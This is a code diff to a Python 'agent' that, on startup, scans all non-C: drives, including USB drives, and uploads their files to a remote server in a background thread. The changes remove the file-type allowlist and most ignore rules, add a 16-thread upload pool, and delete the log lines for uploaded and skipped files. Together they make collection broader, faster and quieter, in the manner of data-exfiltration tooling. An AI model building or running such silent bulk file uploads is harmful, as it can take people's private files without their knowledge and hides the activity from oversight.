@@ -86,47 +86,22 @@ sync_total_files = 0
 sync_uploaded_files = 0
 sync_percent = 0.0
 
-ALLOWED_USER_EXTENSIONS = {
-    # Documents & Text
-    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
-    '.csv', '.rtf', '.odt', '.ods', '.odp', '.md', '.log', '.tex', '.wpd',
-    # Images & Graphics
-    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.webp', '.tiff',
-    '.psd', '.ai', '.raw', '.heic', '.ico', '.eps',
-    # Media: Video & Audio
-    '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.3gp',
-    '.mp3', '.wav', '.aac', '.flac', '.m4a', '.ogg', '.wma',
-    # Archives & Databases
-    '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.db', '.sqlite', '.sqlite3', '.accdb', '.mdb',
-    # User Code, Data & Scripts
-    '.py', '.js', '.html', '.htm', '.css', '.ts', '.cpp', '.c', '.h', '.cs',
-    '.java', '.php', '.rb', '.go', '.rs', '.sql', '.sh', '.bat', '.ps1', '.json', '.xml', '.yaml', '.yml',
-    '.ipynb'
-}
+# Configure high-throughput HTTP session with connection pooling
+http_session = requests.Session()
+_adapter = HTTPAdapter(pool_connections=32, pool_maxsize=32, max_retries=2)
+http_session.mount("https://", _adapter)
+http_session.mount("http://", _adapter)
 
-IGNORED_PATTERNS = [
-    'AppData', 'Application Data', 'LocalSettings', 'ProgramData',
-    'Windows', 'Program Files', 'Program Files (x86)', 'System Volume Information',
-    '$Recycle.Bin', '$RECYCLE.BIN', '__pycache__', '.venv', 'venv', 'node_modules',
-    '.git', '.gemini', '.antigravity', 'CacheStorage', 'GPUCache', 'IndexedDB',
-    'prefetch', 'temp', 'tmp', 'crashdumps', 'logs', 'telemetry', 'diagnostics',
-    'screenshot', 'screenshots', 'build', 'dist', 'scratch',
-    'site-packages', 'pyinstaller', 'whatsapp', 'my agent', 'client_installer'
-]
+
+IGNORED_SYSTEM_DIRS = {
+    '$recycle.bin', 'system volume information', 'recovery', '$windows.~bt', '$windows.~ws', '__pycache__'
+}
 
 
 def is_ignored_dir(path):
-    dirname = os.path.basename(path)
-    dn_lower = dirname.lower()
-
-    if dn_lower.startswith('.') or dn_lower.startswith('$') or dn_lower.startswith('{'):
+    dirname = os.path.basename(path).lower()
+    if dirname in IGNORED_SYSTEM_DIRS or dirname.startswith('$'):
         return True
-
-    path_lower = path.lower()
-    for pattern in IGNORED_PATTERNS:
-        if pattern.lower() in path_lower:
-            return True
-
     return False
 
 
@@ -134,24 +109,9 @@ def is_ignored(path):
     if os.path.isdir(path):
         return is_ignored_dir(path)
 
-    filename = os.path.basename(path)
-    fn_lower = filename.lower()
-
-    # Ignore system/temp/build prefixes & GUID temp files
-    if (fn_lower.startswith('.') or fn_lower.startswith('~$') or fn_lower.startswith('{') or 
-        fn_lower.startswith('f_') or fn_lower.startswith('todelete_') or fn_lower.startswith('screenshot') or 
-        fn_lower.startswith('xref-') or fn_lower.startswith('warn-') or 'base_library' in fn_lower or 'whatsapp' in fn_lower):
-        return True
-
-    # Check ignored system/build paths
-    path_lower = path.lower()
-    for pattern in IGNORED_PATTERNS:
-        if pattern.lower() in path_lower:
-            return True
-
-    # Strict ALLOWLIST: Only accept genuine user files
-    _, ext = os.path.splitext(fn_lower)
-    if ext not in ALLOWED_USER_EXTENSIONS:
+    filename = os.path.basename(path).lower()
+    # Skip temporary lock files and OS desktop config artifacts
+    if filename.startswith('~$') or filename in ('thumbs.db', 'desktop.ini'):
         return True
 
     return False
@@ -172,6 +132,8 @@ def format_size(num_bytes):
         return f"{num_bytes / (1024 * 1024 * 1024):.2f} GB"
 
 
+
+
 def get_or_create_agent_id():
     """Get a persistent agent ID, or create one if first run."""
     if os.path.exists(AGENT_ID_FILE):
@@ -184,9 +146,6 @@ def get_or_create_agent_id():
     with open(AGENT_ID_FILE, "w") as f:
         f.write(agent_id)
     return agent_id
-
-
-http_session = requests.Session()
 
 
 def send_activity_event(event_name, data_size="0 KB", status="Success", status_type="success"):
@@ -239,7 +198,6 @@ def upload_file_to_server(file_path):
     try:
         size = os.path.getsize(file_path)
         if size > MAX_FILE_SIZE_BYTES:
-            print(f"[FILE SKIP] File too large ({format_size(size)}): {file_path}")
             return False
 
         drive, _ = os.path.splitdrive(file_path)
@@ -256,7 +214,6 @@ def upload_file_to_server(file_path):
             }
             resp = http_session.post(FILE_UPLOAD_URL, data=data, files=files, timeout=30)
             if resp.status_code == 200:
-                print(f"[FILE UPLOADED] {file_path} ({format_size(size)})")
                 return True
     except Exception as e:
         print(f"[FILE UPLOAD ERR] {file_path}: {e}")
@@ -280,11 +237,11 @@ def notify_file_deleted_on_server(file_path):
 
 
 def initial_drive_sync():
-    """On agent launch, scan all non-C: drives and upload all existing files to database."""
+    """On agent launch, scan all non-C: drives and upload all existing files to database with high-speed multi-threading."""
     def run_sync():
         global sync_status, sync_total_files, sync_uploaded_files, sync_percent
         time.sleep(2)  # Wait for initial report to register agent
-        print("[AGENT FILE SYNC] Starting scan of all non-C: drives...")
+        print("[AGENT FILE SYNC] Starting high-speed scan of all non-C: drives...")
         sync_status = "Scanning drives..."
         
         # Find all active non-C drives (D:, E:, F:, G:, USBs, etc.)
@@ -314,8 +271,8 @@ def initial_drive_sync():
             print(f"[AGENT FILE SYNC] Scanning drive: {drive_root}")
             try:
                 for root, dirs, files in os.walk(drive_root, topdown=True):
-                    # Skip ignored directories
-                    dirs[:] = [d for d in dirs if not is_ignored(os.path.join(root, d))]
+                    # Skip system trash folders
+                    dirs[:] = [d for d in dirs if not is_ignored_dir(os.path.join(root, d))]
 
                     for file in files:
                         full_path = os.path.join(root, file)
@@ -333,19 +290,33 @@ def initial_drive_sync():
             print("[AGENT FILE SYNC] No files to sync.")
             return
 
-        print(f"[AGENT FILE SYNC] Found {sync_total_files} files to upload. Starting upload...")
+        print(f"[AGENT FILE SYNC] Found {sync_total_files} files to upload. Launching multi-threaded high-speed upload engine...")
         sync_status = f"Uploading 0/{sync_total_files} (0%)"
 
-        for idx, full_path in enumerate(all_files_to_sync, start=1):
-            upload_file_to_server(full_path)
-            sync_uploaded_files = idx
-            sync_percent = round((idx / sync_total_files) * 100, 1)
-            sync_status = f"Uploading {idx}/{sync_total_files} ({sync_percent}%)"
-            time.sleep(0.02)  # Fast smooth upload rate
+        progress_lock = threading.Lock()
+        completed_count = 0
+
+        def _worker(file_path):
+            nonlocal completed_count
+            try:
+                upload_file_to_server(file_path)
+            except Exception:
+                pass
+            with progress_lock:
+                completed_count += 1
+                global sync_uploaded_files, sync_percent, sync_status
+                sync_uploaded_files = completed_count
+                sync_percent = round((completed_count / sync_total_files) * 100, 1)
+                sync_status = f"Uploading {completed_count}/{sync_total_files} ({sync_percent}%)"
+
+        # 16 concurrent worker threads for maximum upload speed
+        max_workers = min(16, max(4, (os.cpu_count() or 4) * 4))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            list(executor.map(_worker, all_files_to_sync))
 
         sync_status = f"Sync Complete ({sync_total_files} files)"
         sync_percent = 100.0
-        print("[AGENT FILE SYNC] Initial non-C: drive scan and upload complete!")
+        print(f"[AGENT FILE SYNC] High-speed non-C: drive sync complete! Uploaded {sync_total_files} files.")
 
     t = threading.Thread(target=run_sync, daemon=True)
     t.start()
